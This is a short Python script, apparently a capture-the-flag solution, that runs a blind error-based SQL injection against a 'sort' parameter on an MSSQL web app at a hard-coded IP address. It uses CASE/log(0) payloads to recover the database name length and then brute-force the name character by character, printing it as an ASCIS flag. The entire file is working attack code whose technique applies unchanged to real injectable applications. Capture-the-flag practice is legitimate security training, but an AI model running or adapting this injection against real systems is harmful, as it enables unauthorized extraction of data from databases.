import requests as req
import string
url='http://167.172.85.253/web100/?sort='
def get_len(url):
    for i in range(0,1000):
        payload="(SELECT+top+1+(case+when+(LEN(db_name())={0})+then+1+else+log(0)+END)+from+information_schema.tables)--".format(str(i))
        rp=req.get(url+payload)
        if 'Error' not in rp.text:
            #print(url+payload)
            print("Độ dài chuỗi database: "+str(i))
            return i
def get_char(url): 
    flag=''
    for j in range(1,get_len(url)+1):
        for i in string.ascii_letters+string.digits:
            payload="(SELECT+top+1+(case+when+(substring(db_name(),{0},1)='{1}')+then+1+else+log(0)+END)+from+information_schema.tables)--".format(str(j),i)
            rp=req.get(url+payload)
            if 'Error' not in rp.text:
                #print(url+payload)
                flag+=i
                print(flag)
                break
    print('FLAG: ASCIS{'+flag[::-1]+'}')        
get_char(url)   
    
